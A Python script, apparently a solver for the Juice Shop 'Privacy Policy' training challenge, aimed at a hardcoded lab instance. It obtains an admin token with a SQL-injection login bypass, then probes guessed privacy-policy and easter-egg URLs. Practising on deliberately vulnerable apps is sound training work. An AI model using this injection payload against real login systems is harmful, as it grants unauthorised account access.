#!/usr/bin/env python3
"""
Privacy Policy Challenge Solver for OWASP Juice Shop v18
This challenge requires reading the privacy policy
"""

import requests
import time
from urllib.parse import quote

TARGET = "http://66.42.93.220:3000"

def solve_privacy_policy():
    """Solve the Privacy Policy challenge"""
    
    print("🎯 PRIVACY POLICY CHALLENGE SOLVER")
    print("=" * 60)
    
    session = requests.Session()
    
    # First check current status
    print("📊 Checking initial challenge status...")
    
    # Login as admin to check status
    login_payload = {"email": "admin@juice-sh.op'--", "password": "anything"}
    resp = session.post(f"{TARGET}/rest/user/login", json=login_payload)
    if resp.status_code == 200:
        token = resp.json()['authentication']['token']
        session.headers['Authorization'] = f'Bearer {token}'
        print("✅ Admin access obtained")
    
    # Check if challenge is already solved
    resp = session.get(f"{TARGET}/api/Challenges/")
    if resp.status_code == 200:
        challenges = resp.json().get('data', [])
        privacy_challenge = next((c for c in challenges if 'Privacy Policy' in c.get('name', '')), None)
        
        if privacy_challenge:
            if privacy_challenge.get('solved', False):
                print(f"\n✅ {privacy_challenge['name']} is already SOLVED!")
                return True
            else:
                print(f"📝 {privacy_challenge['name']} - Currently not solved")
                print(f"   Category: {privacy_challenge.get('category', 'Unknown')}")
                print(f"   Difficulty: {'⭐' * privacy_challenge.get('difficulty', 1)}")
    
    print("\n🔧 Attempting to solve Privacy Policy challenge...")
    
    # Method 1: Direct access to privacy policy page
    print("\n1️⃣ Method 1: Direct privacy policy access")
    privacy_urls = [
        f"{TARGET}/privacy-security/privacy-policy",
        f"{TARGET}/privacy-policy",
        f"{TARGET}/#/privacy-security/privacy-policy",
        f"{TARGET}/ftp/legal.md",
        f"{TARGET}/api/privacy",
        f"{TARGET}/privacy",
        f"{TARGET}/legal",
        f"{TARGET}/terms",
    ]
    
    for url in privacy_urls:
        try:
            print(f"   Trying: {url}")
            resp = session.get(url, allow_redirects=True)
            if resp.status_code == 200:
                print(f"   ✅ Accessed: {url} (Status: {resp.status_code})")
                time.sleep(1)
        except:
            pass
    
    # Method 2: Look for privacy policy in different sections
    print("\n2️⃣ Method 2: Searching for privacy policy links")
    
    # Try to access About page which often has privacy policy
    about_urls = [
        f"{TARGET}/#/about",
        f"{TARGET}/about",
        f"{TARGET}/#/contact",
    ]
    
    for url in about_urls:
        try:
            resp = session.get(url)
            if resp.status_code == 200:
                print(f"   ✅ Checked: {url}")
        except:
            pass
    
    # Method 3: Check FTP for legal documents
    print("\n3️⃣ Method 3: FTP directory legal documents")
    ftp_files = [
        "/ftp/",
        "/ftp/legal.md",
        "/ftp/privacy.md",
        "/ftp/terms.md",
    ]
    
    for file_path in ftp_files:
        try:
            resp = session.get(f"{TARGET}{file_path}")
            if resp.status_code == 200:
                print(f"   ✅ Found: {file_path}")
                # If it's the legal.md file, read it
                if 'legal' in file_path.lower() or 'privacy' in file_path.lower():
                    print(f"   📄 Reading privacy policy content...")
                    time.sleep(1)
        except:
            pass
    
    # Method 4: Try hidden endpoints
    print("\n4️⃣ Method 4: Hidden privacy endpoints")
    hidden_urls = [
        f"{TARGET}/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility",
        f"{TARGET}/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg",
    ]
    
    for url in hidden_urls:
        try:
            resp = session.get(url)
            if resp.status_code == 200:
                print(f"   ✅ Found hidden page: {url}")
        except:
            pass
    
    # Method 5: Use the Angular routing
    print("\n5️⃣ Method 5: Angular route navigation")
    angular_routes = [
        "privacy-policy",
        "privacy-security/privacy-policy",
        "privacy-security",
    ]
    
    for route in angular_routes:
        try:
            url = f"{TARGET}/#/{route}"
            resp = session.get(url)
            print(f"   Navigated to: {url}")
            time.sleep(1)
        except:
            pass
    
    # Wait for challenge to register
    print("\n⏳ Waiting for challenge to register...")
    time.sleep(3)
    
    # Check final status
    print("\n📊 Checking final challenge status...")
    resp = session.get(f"{TARGET}/api/Challenges/")
    if resp.status_code == 200:
        challenges = resp.json().get('data', [])
        privacy_challenge = next((c for c in challenges if 'Privacy Policy' in c.get('name', '')), None)
        
        if privacy_challenge:
            if privacy_challenge.get('solved', False):
                print(f"\n✅ SUCCESS! {privacy_challenge['name']} is SOLVED!")
                print(f"   Category: {privacy_challenge.get('category', 'Unknown')}")
                print(f"   Difficulty: {'⭐' * privacy_challenge.get('difficulty', 1)}")
                return True
            else:
                print(f"\n⚠️ {privacy_challenge['name']} not yet marked as solved")
                print("\n💡 Manual steps to try:")
                print("   1. Navigate to http://66.42.93.220:3000")
                print("   2. Look for 'Privacy Policy' link in footer or menu")
                print("   3. Click on it to view the privacy policy")
                print("   4. Or try: http://66.42.93.220:3000/privacy-security/privacy-policy")
    
    print("\n" + "=" * 60)
    print("📊 Check the scoreboard: http://66.42.93.220:3000/#/score-board")
    
    return False

if __name__ == "__main__":
    result = solve_privacy_policy()
    if not result:
        print("\n📝 Note: This challenge may require browser interaction")
        print("   The privacy policy page needs to be fully loaded in a browser")
